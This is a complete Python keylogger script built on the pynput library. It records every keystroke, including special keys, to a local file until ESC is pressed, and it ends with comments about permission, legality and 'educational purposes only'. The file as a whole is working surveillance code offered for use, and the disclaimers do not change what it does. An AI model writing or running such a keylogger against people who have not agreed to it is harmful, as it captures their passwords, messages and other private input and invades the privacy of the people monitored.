# simple_keylogger.py

from pynput import keyboard

log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(key.char)
    except AttributeError:
        # Special keys (space, enter, etc.)
        with open(log_file, "a") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            else:
                f.write(f" [{key.name}] ")

def on_release(key):
    # Stop listener if ESC is pressed
    if key == keyboard.Key.esc:
        print("Exiting keylogger...")
        return False

def main():
    print("Starting keylogger. Press ESC to stop.")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
# A simple keylogger that records keystrokes to a file.
# Press ESC to stop the keylogger.
# Requires the 'pynput' library: pip install pynput
# Note: Use this script responsibly and ensure you have permission to log keystrokes on the target machine.

# Warning: Logging keystrokes can be illegal and unethical if done without consent.
# Always inform users and obtain explicit permission before using keylogging software.

# This script is for educational purposes only.
# Always comply with local laws and regulations regarding privacy and data collection.

# Ensure you have the necessary permissions to run this script on your system.

# Disclaimer: The author is not responsible for any misuse of this code.


# End of simple_keylogger.py


